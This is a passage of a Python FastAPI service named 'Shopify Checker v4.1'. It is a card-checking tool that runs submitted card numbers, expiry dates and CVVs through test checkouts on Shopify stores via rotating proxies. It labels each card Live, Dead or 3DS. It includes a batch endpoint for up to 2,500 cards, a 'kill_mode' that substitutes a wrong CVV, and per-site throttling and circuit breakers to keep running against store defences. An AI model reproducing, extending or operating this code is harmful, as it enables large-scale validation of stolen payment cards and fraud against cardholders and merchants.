        return False, (f"PROXY_ERROR: {str(e)[:60]}" if proxy else "CARD_DECLINED"), gateway, total_price, currency
    except Exception as e:
        _emsg = str(e) or type(e).__name__
        if "timeout" in _emsg.lower():
            return False, "TIMEOUT", gateway, total_price, currency
        return False, f"Error: {_emsg[:100]}", gateway, total_price, currency


# ============================================================
# Throttled Wrapper
# ============================================================
async def throttled_process_card(cc, mes, ano, cvv, site_url,
                                  variant_id=None, proxy_str=None, uid=None):
    global _ACTIVE_WORKERS

    ourl = (site_url if site_url.startswith('http') else f'https://{site_url}').rstrip('/')
    domain = urlparse(ourl).netloc

    if not await _site_cb.is_healthy(domain):
        return False, "E_SITE_CIRCUIT", "UNKNOWN", "0.00", "USD"

    checkout_id = f"{cc[:6]}..{cc[-4:]}:{domain}:{int(time.time() * 1000)}"
    assigned = await _proxy_manager.get_or_assign(checkout_id, proxy_str)
    if assigned:
        proxy_str = assigned
    parsed_proxy = _proxy_manager.parse(proxy_str)

    t0 = time.time()
    site_sem = await _site_sem_mgr.acquire(domain)

    success = False
    message = "UNKNOWN"
    gateway = "UNKNOWN"
    price = "0.00"
    currency = "USD"

    try:
        global_sem = await _get_global_semaphore()
        user_sem = await _get_user_semaphore(uid)

        async with global_sem:
            async with user_sem:
                async with site_sem:
                    _ACTIVE_WORKERS += 1
                    try:
                        result = await process_card(
                            cc, mes, ano, cvv, ourl, variant_id, proxy_str
                        )
                        if isinstance(result, tuple) and len(result) >= 5:
                            success, message, gateway, price, currency = result[:5]
                        else:
                            message = "Invalid result"
                    except Exception as e:
                        message = f"ERROR: {e}"
                    finally:
                        _ACTIVE_WORKERS -= 1

        msg_lo = str(message).lower()
        is_proxy_error = any(k in msg_lo for k in (
            "proxy error", "e_prx", "timeout", "timed out", "e_dns",
            "connection reset", "connection refused",
        ))
        is_site_error = any(k in msg_lo for k in (
            "502", "503", "504", "site error", "html block",
        ))

        if success:
            await _proxy_cb.record_success(parsed_proxy)
            await _proxy_manager.record_success(parsed_proxy)
            await _site_cb.record_success(domain)
            await site_sem.on_success()
        elif is_proxy_error:
            await _proxy_cb.record_fail(parsed_proxy)
            await _proxy_manager.record_fail(parsed_proxy)
            await site_sem.on_fail()
        elif is_site_error:
            await _site_cb.record_fail(domain)
            await site_sem.on_fail()

        msg_up = str(message).upper()
        _is_declined_metric = any(k in msg_up for k in _DECLINED_KEYWORDS)
        _is_error_metric = any(k in msg_up for k in _INFRA_ERROR_UPPER)
        async with _METRICS_LOCK:
            _METRICS["total_requests"] += 1
            if success and not _is_declined_metric and not _is_error_metric:
                if any(k in msg_up for k in ("3DS", "OTP", "ACTION_REQUIRED", "AUTH_REQUIRED", "AUTHENTICATION")):
                    _METRICS["3ds"] += 1
                else:
                    _METRICS["Live"] += 1
            else:
                if is_proxy_error:
                    _METRICS["PROXY_ERROR"] += 1
                elif is_site_error or any(k in msg_up for k in ("SITE", "E_SITE", "E_CART", "E_CHK")):
                    _METRICS["SITE_ERROR"] += 1
                elif "CAPTCHA" in msg_up:
                    _METRICS["CAPTCHA"] += 1
                elif "TIMEOUT" in msg_up:
                    _METRICS["TIMEOUT"] += 1
                elif "ORDER_PROCESSING" in msg_up:
                    _METRICS["ORDER_PROCESSING"] += 1
                else:
                    _METRICS["Dead"] += 1

        _LATENCIES.append(int((time.time() - t0) * 1000))
        return success, message, gateway, price, currency

    finally:
        await _site_sem_mgr.release(domain)
        await _proxy_manager.release(checkout_id)


# ============================================================
# Lifecycle — periodic cleanup
# ============================================================
_cleanup_task = None


async def _periodic_cleanup():
    while True:
        try:
            await asyncio.sleep(_cfg("CLEANUP_INTERVAL_SEC", 120))
            now = time.time()
            await _proxy_manager.cleanup_stale(max_age=300)
            async with _proxy_cb._lock:
                for k in list(_proxy_cb._dead_until.keys()):
                    if _proxy_cb._dead_until[k] < now:
                        _proxy_cb._dead_until.pop(k, None)
            async with _site_cb._lock:
                for k in list(_site_cb._dead_until.keys()):
                    if _site_cb._dead_until[k] < now:
                        _site_cb._dead_until.pop(k, None)

            async with _user_semaphore_lock:
                if len(_user_semaphores) > 1000:
                    to_remove = len(_user_semaphores) - 500
                    for k in list(_user_semaphores.keys())[:to_remove]:
                        _user_semaphores.pop(k, None)

            # QID cache cleanup
            async with _QIDS_CACHE_LOCK:
                _qid_now = time.time()
                for _k in list(_QIDS_CACHE.keys()):
                    if _qid_now - _QIDS_CACHE[_k][1] > _QIDS_TTL * 2:
                        _QIDS_CACHE.pop(_k, None)

            _ttl_stale = _cfg("PRODUCTS_CACHE_TTL", 120) * _cfg("PRODUCTS_CACHE_STALE_MULT", 5.0)
            for _k in list(_products_cache.keys()):
                if now - _products_cache[_k].get("ts", 0) > _ttl_stale:
                    _products_cache.pop(_k, None)

            async with _proxy_manager._lock:
                for k in list(_proxy_manager._stats.keys()):
                    s = _proxy_manager._stats.get(k) or {}
                    if (s.get("success", 0) == 0
                            and s.get("last_fail", 0) > 0
                            and now - s["last_fail"] > 3600):
                        _proxy_manager._stats.pop(k, None)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.debug(f"cleanup error: {e}")


# ============================================================
# FastAPI App
# ============================================================
app = FastAPI(title="Shopify Checker v4.1")


@app.get("/shopify")
async def shopify_checker(
    site: str = Query(...),
    cc: str = Query(...),
    proxy: str = Query(None),
    variant: str = Query(None),
    uid: str = Query(None),
    kill_mode: str = Query(None),
):
    start_time = time.time()
    try:
        if not site:
            raise HTTPException(status_code=400, detail="Missing 'site'")
        if not cc:
            raise HTTPException(status_code=400, detail="Missing 'cc'")
        try:
            cc_parts = parse_cc_string(cc)
        except ValueError as e:
            raise HTTPException(status_code=400, detail=str(e))

        if kill_mode and kill_mode.lower() in ("1", "true", "yes", "on"):
            real_cvv = cc_parts['cvv']
            wrong_cvv = real_cvv
            while wrong_cvv == real_cvv:
                wrong_cvv = str(random.randint(0, (10 ** len(real_cvv)) - 1)).zfill(len(real_cvv))
            cc_parts['cvv'] = wrong_cvv

        success, message, gateway, price, currency = await throttled_process_card(
            cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
            site, variant, proxy, uid=uid,
        )
        elapsed = time.time() - start_time
        proxy_status = "Live" if proxy else "None"
        return JSONResponse(content=_build_response_data(
            success=success, message=message, gateway=gateway,
            price=price, currency=currency, card=cc,
            elapsed=elapsed, proxy_status=proxy_status,
        ))
    except HTTPException as e:
        elapsed = time.time() - start_time
        return JSONResponse(
            status_code=e.status_code,
            content=_build_response_data(False, str(e.detail), "UNKNOWN", "0.0", "USD", cc, elapsed, "None"),
        )
    except Exception as e:
        logger.error(f"shopify_checker error: {e}")
        elapsed = time.time() - start_time
        return JSONResponse(
            status_code=500,
            content=_build_response_data(False, f"ERROR: {str(e)}", "UNKNOWN", "0.0", "USD", cc, elapsed, "None"),
        )


@app.post("/batch")
async def batch_checker(request: Request):
    try:
        data = await request.json()
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid JSON body")

    site = data.get('site', '')
    cards = data.get('cards', [])
    variant_id = data.get('variant')
    uid = data.get('uid')
    proxy_list = data.get('proxies', [])
    single_proxy = data.get('proxy')
    if not proxy_list and single_proxy:
        proxy_list = [single_proxy]

    if not site:
        raise HTTPException(status_code=400, detail="Missing 'site'")
    if not cards or not isinstance(cards, list):
        raise HTTPException(status_code=400, detail="Missing or invalid 'cards'")
    if len(cards) > 2500:
        raise HTTPException(status_code=400, detail="Max 2500 cards")

    kill_mode = str(data.get('kill_mode', '')).lower() in ('1', 'true', 'yes', 'on')
    parsed = []
    for i, cc_string in enumerate(cards):
        px = proxy_list[i % len(proxy_list)] if proxy_list else None
        s = str(cc_string).strip() if cc_string is not None else ""
        try:
            parts = parse_cc_string(s)
            if kill_mode:
                real_cvv = parts['cvv']
                wrong = real_cvv
                while wrong == real_cvv:
                    wrong = str(random.randint(0, (10 ** len(real_cvv)) - 1)).zfill(len(real_cvv))
                parts['cvv'] = wrong
            parsed.append((s, parts, px))
        except ValueError:
            parsed.append((s, None, px))

    async def _run_one(cc_str, parts, px):
        if parts is None:
            return (cc_str, False, "Invalid CC format", "UNKNOWN", "0.00", "USD", px)
        try:
            s, m, g, pr, c = await throttled_process_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'],
                site, variant_id, px, uid=uid,
            )
            return (cc_str, s, m, g, pr, c, px)
        except Exception as ex:
            return (cc_str, False, str(ex), "UNKNOWN", "0.00", "USD", px)

    results = await asyncio.gather(*[_run_one(cs, p, px) for cs, p, px in parsed])
    output = [_build_response_data(s, m, g, pr, c, cs, 0.0, "Live" if px else "None")
              for cs, s, m, g, pr, c, px in results]
    return JSONResponse(content=output)


@app.get("/site_check")
async def site_check(site: str = Query(...), proxy: str = Query(None)):
    if not site:
        raise HTTPException(status_code=400, detail="Missing 'site'")
    ourl = (site if site.startswith('http') else f'https://{site}').rstrip('/')
    try:
        info = await fetch_products(ourl, proxy)
        if isinstance(info, tuple) and info[0] is False:
            return JSONResponse(content={"valid": False, "site": site, "error": str(info[1])})
        if isinstance(info, dict):
            return JSONResponse(content={
                "valid": True, "site": site,
                "variant_id": info.get('variant_id'),
                "price": info.get('price'),
                "link": info.get('link'),
                "requires_shipping": info.get('requires_shipping', False),
            })
        return JSONResponse(content={"valid": False, "site": site, "error": "No product"})
    except Exception as e:
        return JSONResponse(content={"valid": False, "site": site, "error": str(e)})


@app.get("/metrics")
async def metrics_endpoint():
    async with _METRICS_LOCK:
        snapshot = dict(_METRICS)
    snapshot["active_workers"] = _ACTIVE_WORKERS
    snapshot["user_semaphores"] = len(_user_semaphores)
    snapshot["site_semaphores"] = len(_site_sem_mgr._semaphores)
    snapshot["sticky_proxies"] = len(_proxy_manager._sticky)
    snapshot["products_cache_size"] = len(_products_cache)
    snapshot["qid_cache_size"] = len(_QIDS_CACHE)
    lat = sorted(_LATENCIES)
    if lat:
        n = len(lat)
        snapshot["avg_response_ms"] = int(sum(lat) / n)
        snapshot["p50_response_ms"] = lat[int(n * 0.50)]
        snapshot["p95_response_ms"] = lat[int(n * 0.95)]
        snapshot["p99_response_ms"] = lat[min(int(n * 0.99), n - 1)]
        snapshot["max_response_ms"] = lat[-1]
    total = snapshot.get("total_requests", 0)
    if total > 0:
        for k in ("Live", "Dead", "3ds", "SITE_ERROR", "PROXY_ERROR", "AMBIGUOUS"):
            snapshot[f"{k}_pct"] = round(snapshot.get(k, 0) * 100.0 / total, 2)
    return JSONResponse(content=snapshot)


@app.get("/health")
async def health_endpoint():
    checks = {
        "process_alive": True, "loop_alive": True,
        "site_sem_count": len(_site_sem_mgr._semaphores),
        "user_sem_count": len(_user_semaphores),
        "persisted_enabled": USE_PERSISTED_ENDPOINT,
        "persisted_ids_loaded": {k: bool(v) for k, v in PERSISTED_IDS.items()},
        "products_cache_size": len(_products_cache),
        "qid_cache_size": len(_QIDS_CACHE),
    }
    try:
        asyncio.get_running_loop()
        checks["loop_alive"] = True
    except RuntimeError:
        checks["loop_alive"] = False
    all_ok = checks["process_alive"] and checks["loop_alive"]
    return JSONResponse(
        content={"healthy": all_ok, "checks": checks},
        status_code=200 if all_ok else 503,
    )


@app.get("/status")
async def status_endpoint():
    return JSONResponse(content={
        "status": "online",
        "version": "4.1",
        "persisted_enabled": USE_PERSISTED_ENDPOINT,
        "active_workers": _ACTIVE_WORKERS,
        "global_limit": _cfg("MAX_CONCURRENT", 500),
        "user_semaphores": len(_user_semaphores),
        "site_semaphores": len(_site_sem_mgr._semaphores),
        "sticky_proxies": len(_proxy_manager._sticky),
        "proxy_stats": len(_proxy_manager._stats),
        "products_cache_size": len(_products_cache),
        "qid_cache_size": len(_QIDS_CACHE),
        "metrics": dict(_METRICS),
    })


@app.get("/delcache")
async def delcache():
    return JSONResponse(content={"status": "success", "cleared": 0,
                                  "note": "no variant cache"})


# ============================================================
# Lifecycle events
# ============================================================
@app.on_event("startup")
async def _on_startup():
    global _cleanup_task
    _cleanup_task = asyncio.create_task(_periodic_cleanup())
    logger.info(
        f"[STARTUP] persisted={USE_PERSISTED_ENDPOINT} "
        f"max_concurrent={_cfg('MAX_CONCURRENT', 500)} "
        f"per_user={_cfg('MAX_PER_USER', 100)} "
        f"poll_attempts={_cfg('POLL_ATTEMPTS', 15)} "
        f"graphql_first=True qid_scraper=True"
    )


@app.on_event("shutdown")
async def _on_shutdown():
    if _cleanup_task:
        _cleanup_task.cancel()
        try:
            await _cleanup_task
        except asyncio.CancelledError:
            pass
        except Exception:
            pass
    logger.info("[SHUTDOWN] Cleanup complete")


# ============================================================
# Signal handlers
# ============================================================
def _handle_signal(signum, frame):
    logger.info(f"Signal {signum} received, exiting")
    os._exit(0)


try:
    signal.signal(signal.SIGTERM, _handle_signal)
    signal.signal(signal.SIGINT, _handle_signal)
except Exception:
    pass


# ============================================================
# Entry point
# ============================================================
if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 5000))
    uvicorn.run(app, host="0.0.0.0", port=port)
